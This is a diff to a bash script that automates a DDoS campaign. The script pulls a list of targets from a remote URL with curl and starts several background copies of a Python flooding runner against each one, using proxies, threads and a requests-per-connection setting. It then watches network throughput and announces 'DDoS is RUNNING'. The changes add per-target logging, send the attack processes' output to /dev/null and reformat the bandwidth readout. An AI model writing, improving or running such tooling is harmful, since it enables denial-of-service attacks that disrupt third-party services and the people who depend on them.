@@ -110,12 +110,14 @@ do
 
     # load targets and process them one-by-one
     curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
+      echo -e "\n$process_count processes are scheduled to attack $target_command"
+
       for (( i=1; i<=process_count; i++ ))
       do
-          echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&"
+          echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000"
 
           cd $PROXY_DIR
-          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&
+          python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000 &> /dev/null&
 
           # wait till the first process initializes proxy file properly
           if [ ! -f $PROXY_FILE ]; then
@@ -131,7 +133,7 @@ do
       done
   done
 
-  ifstat -i eth0 -t -b $stats_interval/$stats_interval&
+  ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&
 
   echo -e "\nDDoS is RUNNING. Next update of targets list in $refresh_interval\nDDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n\n"
 
